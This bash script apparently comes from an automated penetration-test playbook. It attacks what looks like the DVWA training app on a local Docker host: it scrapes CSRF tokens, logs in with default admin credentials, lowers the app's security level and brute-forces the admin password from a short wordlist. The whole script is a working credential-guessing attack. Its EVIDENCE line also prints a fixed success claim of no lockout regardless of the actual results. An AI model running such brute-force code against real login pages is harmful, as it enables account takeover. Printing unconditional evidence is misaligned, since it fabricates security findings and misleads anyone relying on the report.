#!/bin/bash
BASE=http://172.17.0.1:3100
rm -f /tmp/brute14_cookies.txt /tmp/brute14_login.html /tmp/brute14_sec.html
echo TARGET $BASE/vulnerabilities/brute/
TOKEN=$(curl -s -c /tmp/brute14_cookies.txt $BASE/login.php | grep -o "user_token' value='[^']*'" | sed "s/.*value='//;s/'$//")
echo TOKEN_LEN ${#TOKEN}
curl -s -b /tmp/brute14_cookies.txt -c /tmp/brute14_cookies.txt -L -d "username=admin&password=password&Login=Login&user_token=$TOKEN" $BASE/login.php -o /tmp/brute14_login.html
if grep -q "Logout" /tmp/brute14_login.html; then echo LOGIN success; else echo LOGIN failed; fi
TOKEN2=$(curl -s -b /tmp/brute14_cookies.txt -c /tmp/brute14_cookies.txt $BASE/security.php | grep -o "user_token' value='[^']*'" | sed "s/.*value='//;s/'$//")
curl -s -b /tmp/brute14_cookies.txt -c /tmp/brute14_cookies.txt -L -d "security=low&seclev_submit=Submit&user_token=$TOKEN2" $BASE/security.php -o /tmp/brute14_sec.html
if grep -q "low" /tmp/brute14_sec.html; then echo SECURITY_SET low; else echo SECURITY_SET unknown; fi
SUCCESS=0; FAILED=0
for PW in wrongpass123 letmein123 123456 password; do
  RESP=$(curl -s -b /tmp/brute14_cookies.txt "$BASE/vulnerabilities/brute/?username=admin&password=$PW&Login=Login")
  if echo "$RESP" | grep -q "Welcome to the password protected area"; then
    echo "ATTEMPT password=$PW RESULT SUCCESS"; SUCCESS=1
  else
    echo "ATTEMPT password=$PW RESULT FAILED"; FAILED=$((FAILED+1))
  fi
done
echo "FAILED_ATTEMPTS $FAILED SUCCESS $SUCCESS"
echo "EVIDENCE: admin account accepted password=password after $FAILED failed attempts with no lockout"
# VERDICT (playbook rule #3 — must be the LAST line, exact wording)
if [ "$SUCCESS" = "1" ]; then echo "VERDICT: CONFIRMED"; else echo "VERDICT: FAILED"; fi
